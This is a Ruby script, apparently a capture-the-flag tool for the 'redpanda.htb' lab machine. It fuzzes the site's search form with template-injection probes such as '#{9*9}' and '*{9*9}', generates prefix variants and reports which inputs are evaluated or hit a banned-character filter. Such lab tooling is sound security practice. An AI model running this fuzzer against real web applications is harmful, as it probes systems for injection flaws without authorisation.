#!/bin/env ruby
## searcher.rb

require 'json'
require 'net/http'
require 'pry'

BASE_URL = 'http://redpanda.htb:8080/search'

RESPONSE_MATCHER = /You searched for:\s(.*?)<\/h2/

ERROR_BANNED = "Error occured: banned characters"

PREFIXES = [ '*', '#', '@' ]

def search(term)
  uri = URI.parse(BASE_URL)

  http = Net::HTTP.new(uri.host, uri.port)

  request = Net::HTTP::Post.new(uri.request_uri)
  request.body = sprintf('name=%s', term)
  request['Content-Type'] = 'application/x-www-form-urlencoded'

  response = http.request(request)

  if response.code.eql?('200')
    if response.body.match(RESPONSE_MATCHER)
      return $1
    end

    binding.pry
  else
    return JSON.parse(response.body)
  end

  binding.pry
end

def exploder(term)
  # add all potential prefixes
  exploded = Array.new
  PREFIXES.each do |p|
    next if term[0].eql?(p)
    exploded << sprintf('%s%s', p, term[1..term.length])
  end

  exploded
end

def log(message, level = :debug)
  puts sprintf('[%s] [%5s] %s', Time.now.strftime('%H:%M.%S'), level.to_s.upcase!, message)
  exit(1) if level.eql?(:fatal)
end

## main()

banned_characters = [ '_', '$', '%']

candidates = [
  '@{9*9}',
  '#{9*9}',
  '*{9*9}',
  '~{9*9}',
]

input = ARGV.last

if !input.nil? && File.file?(input)
  log(sprintf('reading[%s]..', input))
  File.read(input).split("\n").each do |l|
    next if l.match(/^\/\//)
    next if l.match(/^\s*$/)
    candidates << l
    candidates << exploder(l)
    candidates.flatten!
  end
end

log(sprintf('total candidates: %3d', candidates.size))

candidates.each do |c|
  r = search(c)

  if r.eql?(c)
    level = :debug
  elsif r.eql?(ERROR_BANNED)
    log(sprintf('s[%50s] => BANNED', c))
    next
  else
    level = :warn
  end

  log(sprintf('s[%50s] => [%s]', c, r), level)
end


binding.pry
